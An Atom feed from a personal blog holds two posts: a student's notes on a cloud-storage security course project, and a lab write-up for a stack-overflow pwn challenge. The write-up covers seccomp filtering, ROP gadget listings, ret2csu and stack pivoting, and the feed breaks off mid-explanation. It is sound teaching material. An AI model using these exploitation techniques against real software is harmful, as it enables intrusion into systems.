<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://tangzichengcc.github.io</id>
    <title>唐仔橙 • Posts by &#34;研究生课程&#34; tag</title>
    <link href="https://tangzichengcc.github.io" />
    <updated>2023-06-18T03:20:48.000Z</updated>
    <category term="旅游" />
    <category term="路由器" />
    <category term="浏览器安全" />
    <category term="C语言" />
    <category term="csapp" />
    <category term="PWN入门" />
    <category term="堆" />
    <category term="脚本" />
    <category term="docker" />
    <category term="研究生课程" />
    <category term="诗歌" />
    <category term="论文" />
    <category term="调试" />
    <category term="KVM" />
    <category term="USENIX" />
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/</id>
        <title>ucas-夏季学期-云存储安全和知识图谱</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
        <content type="html">&lt;p&gt;​		夏季学期选课选到了第一周,一周上完,满满的五天课,还是收获了很多的. 首先是这个云计算安全实践(其实是云存储安全实践)做了一个小系统,正好本身打算学c++,这就提前做个小项目了,感觉收获蛮多的. 然后就是知识图谱课程,当初了解知识图谱是导师给我推荐,可以用这个来整理自己的笔记,后来用了用(可能还算不上知识图谱,就是图),确实感觉很不错,因为更符合人的思维习惯我觉得,用图的形式来表达,能够更好地看清事物之间的联系,&lt;font color=&#34;red&#34;&gt;也有助于建立自己的知识体系!&lt;/font&gt;   &lt;/p&gt;
&lt;p&gt;​		不过选了知识图谱这个课程…可能是个错误的选择…真要深入了解的话,隔行如隔山,什么自然语言处理,各种机器学习的东西像听天书一样,听的我头大(头疼),确实不太喜欢这个东西, 不过也反思了一下自己,如果真的有必要去学的话,要克制一下自己的喜好,该学的要学.&lt;/p&gt;
&lt;h1 id=&#34;云存储安全&#34;&gt;&lt;a href=&#34;#云存储安全&#34; class=&#34;headerlink&#34; title=&#34;云存储安全&#34;&gt;&lt;/a&gt;云存储安全&lt;/h1&gt;&lt;p&gt;​		老师它们甚至还写了本书,为了这个课程(或许是有了书才有的课程),这本书里应该把整个系统的实现写的差不多了,代码完成了百分之七八十,所需要的是理解原理,看懂代码,然后进行CV(小小修改)&lt;/p&gt;
&lt;p&gt;​		书籍: 《云存储安全实践》  陈驰老师团队 (微信读书有的)&lt;/p&gt;
&lt;p&gt;​		这个系统主要是实现一个类似云盘功能的东西,然后加入了很多安全的东西,比如三权分立,有账户管理的管理员、有日志管理的管理员、有系统的管理员,然后就是普通用户了. &lt;/p&gt;
&lt;p&gt;​		然后对于核心的用户功能,类似于实现了一个云盘,用户可以上传文件,然后文件是加密传输的,存储到阿里云等公有云上,密钥存储到另外一个云管理平台上,这样就保证了即便数据泄露了,也不会被攻击者轻易得到数据.&lt;/p&gt;
&lt;p&gt;​		前端采用QT框架,利用c++进行开发,后端采用java.&lt;/p&gt;
&lt;p&gt;​		其实没有设计太复杂的编程,本质还是增删改查,融入了一些安全的理念以及云存储的一点功能.(不过不是说这个系统很简单,这个系统确实能学到很多东西)&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;​		以及通过这次实验,让我加深了一个印象,编程不是魔法,没有什么特殊的技巧,更重要的是基础, 尤其是在这次编程中体会到了模版函数等各种机制的利用会带来非常大的便利,比如说很多功能类似的函数,这时候就需要模版函数了,很多复杂的功能,也都是最基本的函数,以及循环、顺序、判断的组合.&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;​		登陆页面:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618114750123.png&#34; alt=&#34;image-20230618114750123&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		用户管理页面:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618124248050.png&#34; alt=&#34;image-20230618124248050&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		文件管理页面:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618124440319.png&#34; alt=&#34;image-20230618124440319&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		搜索功能&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618124453175.png&#34; alt=&#34;image-20230618124453175&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;知识图谱&#34;&gt;&lt;a href=&#34;#知识图谱&#34; class=&#34;headerlink&#34; title=&#34;知识图谱&#34;&gt;&lt;/a&gt;知识图谱&lt;/h1&gt;&lt;p&gt;​		没什么评价…………..听天书……….&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2023-06-18T03:20:48.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/</id>
        <title>ucas-高级网络攻防-实验二-pwn1-栈</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/"/>
        <content type="html">&lt;p&gt;题目链接:&lt;a href=&#34;https://tangzichengcc.github.io/2023/04/04/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/rop&#34;&gt;https://tangzichengcc.github.io/2023/04/04/ucas-高级网络攻防-实验二-pwn1-栈/rop&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;课上的pwn的练习1,总结来说基础差的太多,一个是漏洞基础,应该先对相应的漏洞的简单题多练一练,深入理解原理,不然后面遇到一点问题就卡住了,另外还是有很多底层的原理,基础知识需要补.&lt;/p&gt;
&lt;h1 id=&#34;第一章-解题过程描述&#34;&gt;&lt;a href=&#34;#第一章-解题过程描述&#34; class=&#34;headerlink&#34; title=&#34;第一章 解题过程描述&#34;&gt;&lt;/a&gt;第一章 解题过程描述&lt;/h1&gt;&lt;h2 id=&#34;一-攻击流程图&#34;&gt;&lt;a href=&#34;#一-攻击流程图&#34; class=&#34;headerlink&#34; title=&#34;一. 攻击流程图&#34;&gt;&lt;/a&gt;一. 攻击流程图&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/orw.drawio.png&#34; alt=&#34;orw.drawio&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;二-详细解题过程&#34;&gt;&lt;a href=&#34;#二-详细解题过程&#34; class=&#34;headerlink&#34; title=&#34;二. 详细解题过程&#34;&gt;&lt;/a&gt;二. 详细解题过程&lt;/h2&gt;&lt;h3 id=&#34;1-ida反汇编查看伪代码&#34;&gt;&lt;a href=&#34;#1-ida反汇编查看伪代码&#34; class=&#34;headerlink&#34; title=&#34;1.ida反汇编查看伪代码&#34;&gt;&lt;/a&gt;1.ida反汇编查看伪代码&lt;/h3&gt;&lt;p&gt;​		可以发现有install_seccomp(argc, argv, envp);函数,说明安装了保护&lt;/p&gt;
&lt;p&gt;​		漏洞点在vuln函数中,存在栈溢出,但只能溢出8字节,显然空间非常需要,需要利用其他技术来布置后续攻击代码&lt;/p&gt;
&lt;h3 id=&#34;2-seccomp保护&#34;&gt;&lt;a href=&#34;#2-seccomp保护&#34; class=&#34;headerlink&#34; title=&#34;2. seccomp保护&#34;&gt;&lt;/a&gt;2. seccomp保护&lt;/h3&gt;&lt;p&gt;​		利用工具seccomp-tools查看&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-24-10-ubuntu:/tmp/330# seccomp-tools dump ./rop &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0000: 0x20 0x00 0x00 0x00000004  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0002: 0x20 0x00 0x00 0x00000000  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0003: 0x35 0x0a 0x00 0x40000000  if (A &amp;gt;= 0x40000000) goto 0014&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0004: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0005: 0x15 0x07 0x00 0x00000101  if (A == openat) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0006: 0x15 0x06 0x00 0x000001b5  if (A == 0x1b5) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0007: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0008: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0009: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0010: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0011: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0012: 0x06 0x00 0x00 0x00050005  return ERRNO(5)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0014: 0x06 0x00 0x00 0x00000000  return KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这段代码的作用是在64位的x86架构上过滤掉不需要的系统调用，只允许执行一些特定的系统调用。如果系统调用是这些特定的系统调用之一，则允许执行，否则拒绝执行。&lt;/p&gt;
&lt;p&gt;​		具体允许的只有open,read,write,exit及其变种. 并且限制了架构,不能使用其他架构下的系统调用. 那么常用的方法是,构造orw链,利用open read write系统调用来读取和打印flag文件.&lt;/p&gt;
&lt;h3 id=&#34;3-寻找gadget&#34;&gt;&lt;a href=&#34;#3-寻找gadget&#34; class=&#34;headerlink&#34; title=&#34;3. 寻找gadget&#34;&gt;&lt;/a&gt;3. 寻找gadget&lt;/h3&gt;&lt;h4 id=&#34;3-1-orw&#34;&gt;&lt;a href=&#34;#3-1-orw&#34; class=&#34;headerlink&#34; title=&#34;3.1 orw&#34;&gt;&lt;/a&gt;3.1 orw&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401100 _open           proc near               ; CODE XREF: some_gifts+1D↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401100                 endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401104                 bnd jmp cs:off_404040&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401104 _open           endp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D0 _read           proc near               ; CODE XREF: vuln+40↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D0                 endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D4                 bnd jmp cs:off_404028&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D4 _read           endp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C0 _write          proc near               ; CODE XREF: main+88↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C0                                         ; main+9E↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C0                 endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C4                 bnd jmp cs:off_404020&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C4 _write          endp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	或者用elf.plt[‘read’]来获取&lt;/p&gt;
&lt;h4 id=&#34;3-2-gadget&#34;&gt;&lt;a href=&#34;#3-2-gadget&#34; class=&#34;headerlink&#34; title=&#34;3.2 gadget&#34;&gt;&lt;/a&gt;3.2 gadget&lt;/h4&gt;&lt;p&gt;​		amd64-64-little, x64架构下,目前应用的调用约定是fastcal,前三个传参的寄存器是rdi rsi rdx &lt;/p&gt;
&lt;p&gt;​		利用工具ROPgadget寻找可用的gadget,找到了rdi和rsi,未找到rdx,rdx的值并不一定总会影响函数的调用,要根据具体情况而定,在本题中,经过测试是会影响的,在read读取flag的时候,rdx代表着读取的长度,经过调试发现被设置为了0,所以读取的是空的.因此需要找到一个能设置rdx寄存器的gadget,会在后续章节说明.&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-24-10-ubuntu:/tmp/330# ROPgadget --binary rop  --only &amp;#x27;pop|ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401480 : pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401482 : pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x00000000004011fd : pop rbp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401483 : pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401481 : pop rsi ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040101a : ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401277 : ret 0x2be&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unique gadgets found: 12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401483 : pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401481 : pop rsi ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h5 id=&#34;3-2-1-ret2csu&#34;&gt;&lt;a href=&#34;#3-2-1-ret2csu&#34; class=&#34;headerlink&#34; title=&#34;3.2.1 ret2csu&#34;&gt;&lt;/a&gt;3.2.1 ret2csu&lt;/h5&gt;&lt;p&gt;​		不同架构的csu代码是不一样的,要根据具体情况而定,就此题的架构而言,csu代码如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		先执行loc_401476里面的代码,进行pop赋值,ret后再执行loc_401460的代码,对传参寄存器进行赋值,然后再利用call 转移控制流&lt;/p&gt;
&lt;p&gt;​		rdi rsi rdx 分别对应着第一次要输入的 r12,r13,r14,call的地址是[r15+rbx*8],可以设置r15为存储跳转地址的地址,rbx为0&lt;/p&gt;
&lt;p&gt;​		设置rbp为1,rbx为0,即可继续往下执行&lt;/p&gt;
&lt;h5 id=&#34;3-2-2-栈迁移的gadget&#34;&gt;&lt;a href=&#34;#3-2-2-栈迁移的gadget&#34; class=&#34;headerlink&#34; title=&#34;3.2.2 栈迁移的gadget&#34;&gt;&lt;/a&gt;3.2.2 栈迁移的gadget&lt;/h5&gt;&lt;p&gt;​		由于只能溢出8字节,是不够布置gadget链的,需要扩展栈空间,通常用的手法是进行栈迁移,移动到一个更大的空间去&lt;/p&gt;
&lt;p&gt;​		leave  &amp;#x3D;&amp;#x3D; mov rsp,rbp;pop rbp;&lt;br&gt;​		ret    &amp;#x3D;&amp;#x3D; pop rip &lt;em&gt;#弹出栈顶数据给rip寄存器&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;​		利用两次leave;ret; 即可控制rsp&lt;/p&gt;
&lt;p&gt;​		mov rsp,rbp;    &amp;#x2F;&amp;#x2F;第一个rbp不受我们的控制，但是下面pop的rbp可以被我们更改，从而就可以控制第二个leave里面的rsp&lt;br&gt;​		pop rbp;&lt;br&gt;​		mov rsp,rbp;&lt;br&gt;​		pop rbp;&lt;br&gt;​		pop rip	&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-24-10-ubuntu:/home/ubuntu/330# ROPgadget --binary rop  --only &amp;#x27;leave|ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x00000000004012a7 : leave ; ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-迁移到bss&#34;&gt;&lt;a href=&#34;#4-迁移到bss&#34; class=&#34;headerlink&#34; title=&#34;4. 迁移到bss&#34;&gt;&lt;/a&gt;4. 迁移到bss&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/stackpivot.drawio.png&#34; alt=&#34;stackpivot.drawio&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		只迁移是不够的,同时应该做到在迁移到的新地方布置好rop链,一个想法是,调用vuln()函数中的read,既可以读取0x110的数据,最后也有leave;ret;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401304 loc_401304:                             ; CODE XREF: vuln+20↑j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401304                 lea     rax, [rbp+buf]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040130B                 mov     edx, 110h       ; nbytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401310                 mov     rsi, rax        ; buf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401313                 mov     edi, 0          ; fd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401318                 call    _read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040131D                 nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040131E                 leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040131F                 retn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		但是这里有一个问题,数据被写入的地方不是rbp,而是rbp-0x100,而经过两次leave;ret;后修改的rsp的值是原始rbp的值,所以还是到达不了rop链的位置,因此,需要第三次的leave;ret;再次修正rsp的位置,这样的话,在第二次leave;ret;的时候,rbp设置为写入地址-0x108,然后第三次leave;ret;就把rsp设置为了rop链的开头&lt;/p&gt;
